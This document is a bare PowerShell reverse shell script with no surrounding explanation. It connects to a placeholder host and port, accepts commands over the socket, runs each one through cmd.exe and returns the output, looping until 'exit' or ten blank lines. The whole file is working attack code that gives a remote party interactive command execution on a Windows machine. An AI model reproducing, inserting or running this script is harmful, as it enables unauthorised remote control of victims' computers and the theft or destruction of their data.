$socket = new-object System.Net.Sockets.TcpClient('<HOST>', <PORT>)
if ($socket -eq $null) {
    exit 1
}
$stream = $socket.GetStream()
$writer = new-object System.IO.StreamWriter($stream)
$buffer = new-object System.Byte[] 1024
$encoding = new-object System.Text.AsciiEncoding
$writer.WriteLine("Hit Ctrl+C (not Ctrl+D!) or enter exit to close connection")
$writer.Write("> ")
$blank = 0
do {
    $command = ""
    $writer.Flush()
    $read = $null
    $res = ""
    while ($stream.DataAvailable -or $read -eq $null) {
        try {
            $read = $stream.Read($buffer, 0, 1024)
        }
        catch {
            $writer.close()
            $socket.close()
            $stream.Dispose()
            exit 1
        }
    }
    $command = $encoding.GetString($buffer, 0, $read).Replace("`r`n", "").Replace("`n", "")
    if ($command.equals("")) {
        $blank += 1
        $writer.WriteLine("WARNING: Closing connection with $(10 - $blank) more blank lines of input")
    } else {
        $blank = 0
    }
    if (!$command.equals("") -and !$command.equals("exit")) {
        $args = ""
        if ($command.IndexOf(' ') -gt -1) {
            $args = $command.substring($command.IndexOf(' ') + 1)
            $command = $command.substring(0, $command.IndexOf(' '))
        }
        $pinfo = New-Object System.Diagnostics.ProcessStartInfo
        $pinfo.FileName = "cmd.exe"
        $pinfo.RedirectStandardError = $true
        $pinfo.RedirectStandardOutput = $true
        $pinfo.UseShellExecute = $false
        $pinfo.Arguments = "/c $command $args"
        $p = New-Object System.Diagnostics.Process
        $p.StartInfo = $pinfo
        $p.Start() | Out-Null
        $p.WaitForExit()
        $stdout = $p.StandardOutput.ReadToEnd()
        $stderr = $p.StandardError.ReadToEnd()
        if ($p.ExitCode -ne 0) {
            $res = $stderr
        } else {
            $res = $stdout
        }
        $p.Close()
        if ($res -ne $null) {
            $writer.WriteLine($res)
        }
    }
    $writer.Write("> ")
} while (!$command.equals("exit") -and $blank -lt 10)
$writer.close()
$socket.close()
$stream.Dispose()
